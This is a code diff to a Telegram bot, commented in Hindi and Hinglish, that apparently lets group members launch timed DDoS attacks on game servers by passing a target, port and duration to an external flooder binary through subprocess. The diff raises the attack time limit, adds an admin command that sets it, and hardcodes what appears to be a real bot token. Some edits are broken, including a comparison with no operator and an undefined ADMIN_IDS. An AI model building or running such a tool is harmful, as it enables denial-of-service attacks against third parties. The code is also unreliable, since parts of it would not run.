@@ -4,31 +4,56 @@ import time
 import subprocess
 import threading
 
-# ✅  TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('tocken')
+# ✅ TELEGRAM BOT TOKEN
+bot = telebot.TeleBot('7053228704:AAGLAJFlzJ6M2XZC9HEABD6B5PVubnd-FqY')
 
-# ✅  GROUP & CHANNEL SETTINGS
+# ✅ GROUP & CHANNEL SETTINGS
 GROUP_ID = "-1001855389923"
 SCREENSHOT_CHANNEL = "@CLouD_VIP_CHEAT"
-SCREENSHOT_CHANNEL_2 = "@KHAPITAR_BALAK77"
-ADMINS = ["7129010361, 1851260327"]
+ADMINS = ["7129010361"]
+ADMINS = [7129010361]
 
 # ✅ GLOBAL VARIABLES
 active_attacks = {}  # अटैक स्टेटस ट्रैक करेगा
 pending_verification = {}  # वेरिफिकेशन के लिए यूजर्स लिस्ट
 user_attack_count = {}
-MAX_ATTACKS = 3  # (या जो भी लिमिट चाहिए)
+MAX_ATTACKS = 2  # (या जो भी लिमिट चाहिए)
+MAX_DURATION = 300
 
-# ✅ CHECK IF USER IS IN BOTH CHANNELS
-def is_user_in_both_channels(user_id):
+# ✅ CHECK IF USER IS IN CHANNEL
+def is_user_in_channel(user_id):
     try:
-        member1 = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
-        member2 = bot.get_chat_member(SCREENSHOT_CHANNEL_2, user_id)
-        return (member1.status in ['member', 'administrator', 'creator']) and (member2.status in ['member', 'administrator', 'creator'])
+        member = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
+        return member.status in ['member', 'administrator', 'creator']
     except:
         return False
 
-# ✅ HANDLE ATTACK COMMAND (FIXED)
+# max time 
+@bot.message_handler(commands=['maxtime'])
+def set_max_duration(message):
+    global MAX_DURATION
+    user_id = message.from_user.id  # Get user ID
+    
+    if user_id in ADMIN_IDS:  # Check if user is an admin
+        try:
+            command_parts = message.text.split()
+            if len(command_parts) != 2:
+                bot.reply_to(message, "Usage: /maxtime [seconds]")
+                return
+
+            new_duration = int(command_parts[1])
+            if new_duration <= 0:
+                bot.reply_to(message, "Duration must be a positive number!")
+                return
+
+            MAX_DURATION = new_duration
+            bot.reply_to(message, f"Max duration updated to {MAX_DURATION} seconds!")
+        except ValueError:
+            bot.reply_to(message, "Invalid number! Please enter a valid duration in seconds.")
+    else:
+        bot.reply_to(message,  "❌❌❌ ONLY MY OWNER !")
+
+# ✅ HANDLE ATTACK COMMAND
 @bot.message_handler(commands=['bgmi'])
 def handle_attack(message):
     user_id = message.from_user.id
@@ -38,13 +63,13 @@ def handle_attack(message):
         bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
         return
 
-    if not is_user_in_both_channels(user_id):
-        bot.reply_to(message, f"❗ **PEHLE DONO CHANNEL JOIN KARO!**\n👉 {SCREENSHOT_CHANNEL}\n👉 {SCREENSHOT_CHANNEL_2}")
+    if not is_user_in_channel(user_id):
+        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KARO!** {SCREENSHOT_CHANNEL}")
         return
 
     # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो
     if user_id in pending_verification:
-        bot.reply_to(message, "🚫 **APKA SCREENSHOT VERIFICATION NHI HUA!**")
+        bot.reply_to(message, "🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
         return
 
     # ✅ अटैक लिमिट चेक करो
@@ -66,9 +91,9 @@ def handle_attack(message):
         bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
         return
 
-    if time_duration > 90:
-        bot.reply_to(message, "🚫 **90S FREE MAIN ETNA HI MILEGA!**")
-        return
+    if time_duration MAX_DURATION:  # Use admin-set MAX_DURATION
+         bot.reply_to(message, f"🚫 MAX ATTACK TIME IS {MAX_DURATION} SECONDS!")
+         return
 
     # ✅ पहले ही वेरिफिकेशन सेट कर दो ताकि यूजर तुरंत स्क्रीनशॉट भेज सके
     pending_verification[user_id] = True
@@ -101,7 +126,7 @@ def handle_attack(message):
     # ✅ Attack Execution Function
     def attack_execution():
         try:
-            subprocess.run(f"./soul {target} {port} {time_duration} 2500", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"./ravi {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
         finally:
@@ -114,7 +139,7 @@ def handle_attack(message):
 
     threading.Thread(target=attack_execution).start()
 
-# ✅ SCREENSHOT VERIFICATION SYSTEM (FIXED)
+# ✅ SCREENSHOT VERIFICATION SYSTEM
 @bot.message_handler(content_types=['photo'])
 def verify_screenshot(message):
     user_id = message.from_user.id
@@ -123,36 +148,12 @@ def verify_screenshot(message):
         bot.reply_to(message, "❌ **TERE KOI PENDING VERIFICATION NAHI HAI! SCREENSHOT FALTU NA BHEJ!**")
         return
 
-    # ✅ SCREENSHOT BOTH CHANNELS FORWARD
+    # ✅ SCREENSHOT CHANNEL FORWARD
     file_id = message.photo[-1].file_id
     bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"📸 **VERIFIED SCREENSHOT FROM:** `{user_id}`")
-    bot.send_photo(SCREENSHOT_CHANNEL_2, file_id, caption=f"📸 **VERIFIED SCREENSHOT FROM:** `{user_id}`")
 
     del pending_verification[user_id]  # ✅ अब यूजर अटैक कर सकता है
     bot.reply_to(message, "✅ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")
-
-# ✅ /ANNOUNCE Command (Admin Only)
-@bot.message_handler(commands=['announce'])
-def announce_message(message):
-    if str(message.from_user.id) not in ADMINS:
-        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
-        return
-
-    command = message.text.split(maxsplit=1)
-    if len(command) < 2:
-        bot.reply_to(message, "⚠ USAGE: /announce <message>")
-        return
-
-    announcement = f"📢 **ANNOUNCEMENT:**\n{command[1]}"
-    
-    # ✅ Auto-Pin Announcement
-    msg = bot.send_message(GROUP_ID, announcement, parse_mode="Markdown")
-    bot.pin_chat_message(GROUP_ID, msg.message_id)
-
-    # ✅ Auto-Delete After 2 Hours (7200 seconds)
-    threading.Timer(7200, lambda: bot.delete_message(GROUP_ID, msg.message_id)).start()
-
-    bot.reply_to(message, "✅ ANNOUNCEMENT SENT & PINNED!")
 
 # ✅ ATTACK STATS COMMAND
 @bot.message_handler(commands=['check'])
@@ -190,9 +191,6 @@ def restart_bot(message):
         subprocess.run("python3 m.py", shell=True)
     else:
         bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")
-
-# ✅ BOT START
-bot.polling(none_stop=True)
 
 # ✅ START POLLING
 bot.polling(none_stop=True)
